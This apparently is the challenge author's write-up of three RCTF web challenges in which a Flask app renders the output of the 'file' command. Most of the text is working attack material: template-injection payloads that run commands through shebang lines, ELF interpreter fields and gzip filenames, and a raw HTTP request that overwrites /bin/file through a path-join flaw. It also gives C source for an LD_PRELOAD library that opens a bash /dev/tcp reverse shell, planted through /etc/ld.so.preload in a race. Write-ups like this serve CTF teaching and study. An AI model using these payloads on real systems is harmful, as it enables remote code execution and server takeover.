## filechecker_mini

- solved: 88/363
- flag: `RCTF{Just_A_5mall_Tr1ck_mini1i1i1__Fl4g_Y0u_gOtt777!!!}`

The server runs the file command on the uploaded file and passes the output to Flask's render_template_string. So we can do template injection as long as we control the output.

### The easiest solution

https://github.com/file/file/blob/master/tests/cmd1.testfile

https://github.com/file/file/blob/master/tests/cmd1.result

The content of the build file is as follows

```
#!/usr/cmd/{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

Upload this file and you will get the flag

### Other interesting solutions

1 modify the interpreter of linux executables

```bash
cp /bin/file filetest
patchelf --set-interpreter "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}" filetest
curl -F 'file-upload=@/mnt/d/Desktop/filetest' http://159.138.107.47:13001/
```

You can also modify the BuildID of the linux executable

2 gzip controls a file name file

```bash
touch "{{config.__class__.__init__.__globals__['os'].popen('cat \x2fflag').read()}}"
gzip \{\{config.__class__.__init__.__globals__\[\'os\'\].popen\(\'cat\ \\x2fflag\'\).read\(\)\}\}
mv \{\{config.__class__.__init__.__globals__\[\'os\'\].popen\(\'cat\ \\x2fflag\'\).read\(\)\}\}.gz 1.gz
curl -F 'file-upload=@/mnt/d/Desktop/1.gz' http://159.138.107.47:13001/
```

3 Modifying the image copyright will also take effect

There are many ways to control the command output, so I won’t go into details here

## filechecker_plus

- solved: 39/363
- flag: `RCTF{III_W4nt_Gir1Friendssssss_Thi5_Christm4ssss~~~~}`

To diff the two zips, I found out that template injection is no longer possible and the web service is running with root privileges.

```python
os.path.exists(filepath) and ".." in filepath:
```

The check for path traversal and existing file is an and. That means we can overwrite files if we don’t use '..' .

To disable directory traversal for "..", I added this logic. This is a logic error, I should replace and with or.  qwq

A small trick for os.path.join

```python
>>> import os
>>> os.path.join("/app/upload/","test")
'/app/upload/test'
>>> os.path.join("/app/upload/","/tmp/test")
'/tmp/test'
```

Now we can overwrite any file, so it is very easy to solve this challenge.

Send the following http package and you will get the flag

```
POST / HTTP/1.1
Host: 159.138.110.192:23002
Content-Length: 211
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Origin: http://159.138.110.192:23002
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuhKRbyDeYPB8r5MS
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://159.138.110.192:23002/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryuhKRbyDeYPB8r5MS
Content-Disposition: form-data; name="file-upload"; filename="/bin/file"
Content-Type: text/plain

#!/bin/bash
cat /flag
------WebKitFormBoundaryuhKRbyDeYPB8r5MS--
```

Of course you can also upload a linux executable file or overwrite index.html to get the flag.    :)

## filechecker_pro_max

- solved: 17/363
- flag: `RCTF{I_Giveeeeeee_Y0oOu_Fl4gsssss_You_G1ve_M3_GirlFriendsssssssssss}`

This time, we can’t overwrite any files. We have to get RCE only by creating new ones.

Use strace to trace what happens when the file command is executed

```bash
strace file /etc/passwd 2>&1 | grep "No such file or directory"
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/locale/C.UTF-8/LC_CTYPE", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
newfstatat(AT_FDCWD, "/home/liao/.magic.mgc", 0x7ffd2bb0bcd0, 0) = -1 ENOENT (No such file or directory)
newfstatat(AT_FDCWD, "/home/liao/.magic", 0x7ffd2bb0bcd0, 0) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/magic.mgc", O_RDONLY) = -1 ENOENT (No such file or directory)
```

We can create a "/etc/ld.so.preload" file that includes "/app/upload/mylseek.so" so that the library is loaded when the server executes the `file` command.

**mylseek.c**

```c
#include <unistd.h>
#include "syscall.h"
#include <stdio.h>
#include <stdlib.h>

off_t lseek(int fd, off_t offset, int whence)
{
    remove("/etc/ld.so.preload"); //without this, the exploit would recursively load mylseek.so
    system("bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'");
#ifdef SYS__llseek
    off_t result;
    return syscall(SYS__llseek, fd, offset>>32, offset, &result, whence) ? -1 : result;
#else
    return syscall(SYS_lseek, fd, offset, whence);
#endif
}
```

gcc mylseek.c -o mylseek.so --shared -fPIC

Of course you can diy your so.     :)

**ld.so.preload**

```
/app/upload/mylseek.so
```

We then just need a race condition when both of the files are present when file is executed.

Use burpsuite's intruder module to upload these two files in multiple threads for a race condition.

mylseek.so -> /app/upload/mylseek.so

ld.so.preload -> /etc/ld.so.preload